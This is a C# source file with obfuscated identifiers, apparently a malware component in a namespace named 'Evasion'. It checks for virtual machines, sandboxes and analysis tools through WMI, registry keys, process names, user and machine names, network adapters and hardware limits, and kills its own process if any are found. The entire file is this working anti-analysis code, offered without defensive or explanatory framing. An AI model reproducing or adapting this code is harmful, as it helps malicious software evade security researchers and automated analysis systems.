using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Principal;
using Microsoft.Win32;

namespace X1a2b3c4.Evasion
{
    public static class H8i9j0k1
    {
        private static readonly string[] Q2w3e4r5 = {
            "vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v",
            "parallels", "sandboxie", "wireshark", "fiddler", "procmon"
        };

        private static readonly string[] T6y7u8i9 = {
            "sample", "malware", "virus", "test", "sandbox", "analyst"
        };

        public static bool Y0p9o8i7()
        {
            try
            {
                if (U6i7o8p9()) return true;
                if (I4o5p6q7()) return true;
                if (O8p9q0w1()) return true;
                if (P1q2w3e4()) return true;
                if (A5s6d7f8()) return true;
                if (S9d0f1g2()) return true;
                if (D3f4g5h6()) return true;
                
                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool U6i7o8p9()
        {
            try
            {
                var L7z8x9c0 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject N1v2b3n4 in L7z8x9c0.Get())
                {
                    string M5m6n7b8 = N1v2b3n4["Manufacturer"]?.ToString()?.ToLower() ?? "";
                    string B9v8c7x6 = N1v2b3n4["Model"]?.ToString()?.ToLower() ?? "";
                    
                    foreach (string V5z4x3c2 in Q2w3e4r5)
                    {
                        if (M5m6n7b8.Contains(V5z4x3c2) || B9v8c7x6.Contains(V5z4x3c2))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool I4o5p6q7()
        {
            try
            {
                var R1e2w3q4 = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS");
                foreach (ManagementObject W5q6a7s8 in R1e2w3q4.Get())
                {
                    string E9s8d7f6 = W5q6a7s8["SerialNumber"]?.ToString()?.ToLower() ?? "";
                    string T5g6f7d8 = W5q6a7s8["Version"]?.ToString()?.ToLower() ?? "";
                    
                    if (E9s8d7f6.Contains("vmware") || E9s8d7f6.Contains("vbox") ||
                        T5g6f7d8.Contains("vbox") || T5g6f7d8.Contains("vmware"))
                        return true;
                }
            }
            catch { }
            return false;
        }

        private static bool O8p9q0w1()
        {
            try
            {
                string[] G7h8j9k0 = {
                    @"SOFTWARE\VMware, Inc.\VMware Tools",
                    @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                    @"HARDWARE\ACPI\DSDT\VBOX__"
                };

                foreach (string L1l2k3j4 in G7h8j9k0)
                {
                    try
                    {
                        using (var Z5x6c7v8 = Registry.LocalMachine.OpenSubKey(L1l2k3j4))
                        {
                            if (Z5x6c7v8 != null) return true;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        private static bool P1q2w3e4()
        {
            try
            {
                Process[] X9c8v7b6 = Process.GetProcesses();
                foreach (Process N5m4n3b2 in X9c8v7b6)
                {
                    string C1v2b3n4 = N5m4n3b2.ProcessName.ToLower();
                    foreach (string M5n6b7v8 in Q2w3e4r5)
                    {
                        if (C1v2b3n4.Contains(M5n6b7v8))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool A5s6d7f8()
        {
            try
            {
                string K9l0p1o2 = Environment.UserName.ToLower();
                string I3u4y5t6 = Environment.MachineName.ToLower();
                
                foreach (string R7e8w9q0 in T6y7u8i9)
                {
                    if (K9l0p1o2.Contains(R7e8w9q0) || I3u4y5t6.Contains(R7e8w9q0))
                        return true;
                }
            }
            catch { }
            return false;
        }

        private static bool S9d0f1g2()
        {
            try
            {
                NetworkInterface[] H4j5k6l7 = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface G8f9d0s1 in H4j5k6l7)
                {
                    string F2g3h4j5 = G8f9d0s1.Description.ToLower();
                    if (F2g3h4j5.Contains("vmware") || F2g3h4j5.Contains("virtualbox") ||
                        F2g3h4j5.Contains("vbox") || F2g3h4j5.Contains("virtual"))
                        return true;
                }
            }
            catch { }
            return false;
        }

        private static bool D3f4g5h6()
        {
            try
            {
                var J6k7l8z9 = DriveInfo.GetDrives();
                foreach (DriveInfo X0c1v2b3 in J6k7l8z9)
                {
                    if (X0c1v2b3.TotalSize < 50L * 1024 * 1024 * 1024)
                        return true;
                }

                if (Environment.ProcessorCount < 2)
                    return true;

                var V4b5n6m7 = new PerformanceCounter("Memory", "Available MBytes");
                if (V4b5n6m7.NextValue() < 2048)
                    return true;
            }
            catch { }
            return false;
        }

        public static void Q7w8e9r0()
        {
            try
            {
                if (Y0p9o8i7())
                {
                    Process.GetCurrentProcess().Kill();
                }
            }
            catch { }
        }
    }
}